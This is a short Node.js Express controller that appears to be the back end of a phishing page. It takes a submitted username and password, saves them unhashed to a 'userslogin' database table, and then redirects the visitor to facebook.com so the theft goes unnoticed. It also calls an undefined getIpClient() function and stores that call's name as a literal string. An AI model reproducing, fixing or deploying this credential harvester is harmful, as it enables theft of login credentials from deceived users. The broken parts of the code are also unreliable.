const conexion = require('../database/db');
const axios = require('axios');


exports.sesion = (req,res) => {
    const user = req.body.username;
    const pass = req.body.password;
    let datecreated = new Date();
    datecreated = datecreated.toISOString();
    getIpClient();
    const inf = 'getIpClient()';
    conexion.query('INSERT into userslogin SET?', {username: user, password: pass, informationnav: inf, created_at: datecreated, updated_at: datecreated}, (error)=>{
        if(error) throw error;
        res.redirect('https://facebook.com');
    })
}